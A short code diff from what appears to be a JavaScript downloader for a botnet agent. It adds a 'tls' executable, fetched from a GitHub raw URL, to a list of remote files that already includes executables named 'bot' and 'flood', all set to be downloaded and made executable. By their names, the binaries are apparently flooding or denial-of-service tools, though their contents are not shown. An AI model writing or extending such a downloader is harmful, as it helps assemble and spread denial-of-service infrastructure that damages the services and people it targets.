@@ -15,6 +15,7 @@ const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/m
 const FILES_TO_DOWNLOAD = [
     { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
     { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
+    { url: `${REPO_BASE}/bots/tls/tls`, filename: 'tls', executable: true },
     { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
 ];
 
